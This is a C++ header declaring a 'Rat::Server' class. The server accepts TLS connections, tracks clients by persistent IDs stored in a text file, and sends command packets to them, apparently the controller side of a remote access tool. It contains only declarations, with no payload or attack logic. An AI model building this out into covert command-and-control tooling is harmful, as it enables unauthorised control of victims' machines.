#ifndef RAT_SERVER_HPP
#define RAT_SERVER_HPP

#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <memory>
#include <set>
#include <unordered_map>
#include <string>
#include <thread>
#include <mutex>
#include "NetworkManager.hpp"
#include "ServerSecurity.hpp"
#include "Packet.pb.h"

namespace Rat 
{

    class Server 
    {
    public:
        Server(uint16_t port);
        ~Server();
        void start();
        void stop();
        ////
    private:
        void initListClientID(const std::string& path = "./list_client.txt");
        void acceptConnections();
        void handleClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client);
        void sendCommandToClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, const rat::Packet& packet);
        void handleUserInput();

        void addClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, uint64_t client_id = uint64_t(-1));
        void removeClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client);

        uint64_t parseStaticIdPayload(const std::string& payload);
        void updateClientWithExistingId(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, uint64_t source_id);
        void assignNewClientId(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, uint64_t &source_id);
        void saveClientIdsToFile(const uint64_t& source_id, const std::string& path = "./list_client.txt");

        std::set<uint64_t> client_id_;
        std::unordered_map<std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>>, uint64_t> clients_;
        // boost::asio::io_context io_context_;
        
        NetworkManager networkManager_;
        boost::asio::ip::tcp::acceptor acceptor_;
        // ServerSecurity security_;
        std::thread input_thread_;
        std::mutex file_save_mutex_;
        std::mutex client_mutex_;
        std::mutex client_id_mutex_;
    };

} // namespace Rat

#endif // RAT_SERVER_HPP